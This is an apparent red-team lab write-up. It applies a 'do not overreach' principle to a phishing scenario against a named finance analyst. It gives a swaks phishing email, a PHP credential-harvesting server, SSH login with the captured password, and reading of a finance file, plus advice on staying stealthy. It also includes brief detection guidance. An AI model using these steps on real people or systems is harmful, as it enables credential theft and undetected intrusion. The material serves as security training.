## **Law 47 — Do Not Go Past the Mark You Aimed For**

Interpretation (offensive context):  
Once the objective is achieved, **stop**. Over-exploitation increases noise, creates anomalies, and triggers detection. Discipline is part of tradecraft.

---

# 🎯 Attack Scenario — _Controlled Success → No Overreach (Stealth Preservation)_

You achieve initial access (credentials) and **intentionally limit further actions** to avoid detection.

**Target:**

> _Rohan Mehta_ — Finance Analyst

**Persona (initial vector):**

> _Elena Volnova_, 20 y/o IT Intern

---

# 🔴 Red Team Objective

- Achieve:
    
    - credential capture
        
- Avoid:
    
    - unnecessary actions (lateral movement, repeated logins)
        
- Preserve:
    
    - stealth and access longevity
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Initial Access (Success Point)

```bash
swaks --to rohan@corp.local \
--from elena.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Access check

Hi,

Please confirm your access:

http://192.168.56.101:8080"
```

---

## Phase 2 — Payload

```bash
php -S 0.0.0.0:8080
```

Captured:

```id="p3n9x4"
rohan:password
```

---

## Phase 3 — Validation (Minimal)

```bash
ssh rohan@192.168.56.102
```

👉 Confirm:

- credentials valid
    

---

## Phase 4 — STOP (Critical Step)

❌ Do NOT:

- run excessive commands
    
- explore entire system
    
- attempt unnecessary privilege escalation
    
- access unrelated files
    

👉 Only perform **predefined objective**

---

## Phase 5 — Controlled Data Access (If Required)

```bash
cat ~/documents/finance.txt
```

👉 Only if part of objective

---

## Phase 6 — Exit

- no additional actions
    
- no repeated logins
    
- no unnecessary persistence
    

👉 Maintain low footprint

---

# 🛠️ Tooling + Commands

### Access:

```bash
ssh rohan@target
```

---

### Hosting:

```bash
php -S 0.0.0.0:8080
```

---

### Capture:

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Objective-driven attacks**
    
- **controlled execution**
    
- SE provides entry—discipline controls outcome
    

Key principle:

> Success is not getting access; it’s keeping it

---

# 🛡️ Detection & Defensive Insight

Indicators of overreach:

- excessive login attempts
    
- abnormal command activity
    
- wide system enumeration
    

Mitigation:

- monitor:
    
    - post-authentication behavior
        
- detect:
    
    - unusual command patterns
        
- enforce:
    
    - least privilege access
        

---

# 📄 Report Artifact

### Title:

> Controlled Access Exploitation with Minimal Footprint

### Include:

- attack entry
    
- credential validation
    
- limited actions performed
    
- analysis:
    
    - why stopping early reduces detection
        
- impact:
    
    - sustained stealth access
        

---

# ⚠️ Operator Insight

Beginners:

- do too much
    
- get detected
    

Operators:

- do exactly enough
    
- remain invisible
    

You don’t maximize activity  
You **optimize restraint**

---

